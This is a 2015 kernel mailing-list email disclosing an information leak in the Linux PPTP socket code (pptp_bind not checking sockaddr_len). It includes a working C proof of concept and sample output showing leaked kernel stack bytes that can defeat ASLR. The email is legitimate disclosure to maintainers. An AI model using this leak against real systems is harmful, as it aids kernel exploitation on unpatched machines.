From: Dmitry Vyukov <dvyukov@gmail.com>
Subject: Information leak in pptp_bind
Date: Mon, 14 Dec 2015 11:38:28 +0100
Message-ID: <CAEeQi3u5VDmmaLGHAzG1NOknXo=Ap0MdXZiYPusEX3VSx8R3Jw@mail.gmail.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Cc: syzkaller@googlegroups.com, Kostya Serebryany <kcc@google.com>,
	Alexander Potapenko <glider@google.com>,
	Dmitry Vyukov <dvyukov@google.com>, edumazet@google.com,
	Sasha Levin <sasha.levin@oracle.com>, keescook@google.com,
	jln@google.com
To: Dmitry Kozlov <xeb@mail.ru>, netdev@vger.kernel.org,
	LKML <linux-kernel@vger.kernel.org>
Return-path: <linux-kernel-owner@vger.kernel.org>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

Hello,

The following program leak various uninit garbage including kernel
addresses and whatever is on kernel stack, in particular defeating
ASLR. The issue is in pptp_bind which does not verify sockaddr_len

#include <sys/types.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <linux/in6.h>
#include <linux/socket.h>
#include <linux/if.h>
#include <linux/if_pppox.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(void)
{
        struct sockaddr sa;
        unsigned len, i, try;
        int fd;

        for (try = 0; try < 5; try++) {
                fd = socket(AF_PPPOX, SOCK_RAW, PX_PROTO_PPTP);
                if (fd == -1)
                        return;
                memset(&sa, 0, sizeof(sa));
                bind(fd, &sa, 0);
                len = sizeof(sa);
                getsockname(fd, &sa, &len);
                for (i = 0; i < len; i++)
                        printf("%02x", ((unsigned char*)&sa)[i]);
                printf("\n");
        }
        return 0;
}

# ./a.out
1800020000004700c012833d00880000b002400000000000005eddc66d2b
1800020000004800408bf13a00880000b002400000000000005eddc66d2b
180002000000490080a5f13a00880000b002400000000000005eddc66d2b
1800020000004a00008ff13a00880000b002400000000000005eddc66d2b
1800020000004b008096f13a00880000b002400000000000005eddc66d2b
